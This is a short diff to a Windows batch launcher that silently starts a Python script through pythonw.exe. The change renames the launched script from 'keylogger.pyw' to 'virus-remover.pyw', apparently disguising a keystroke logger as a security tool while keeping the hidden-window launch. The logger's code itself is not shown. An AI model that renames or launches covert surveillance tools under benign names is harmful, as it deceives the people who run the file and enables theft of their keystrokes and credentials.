@@ -1,3 +1,3 @@
 @echo off
-start "" "pythonw.exe" "%~dp0keylogger.pyw"
+start "" "pythonw.exe" "%~dp0virus-remover.pyw"
 exit
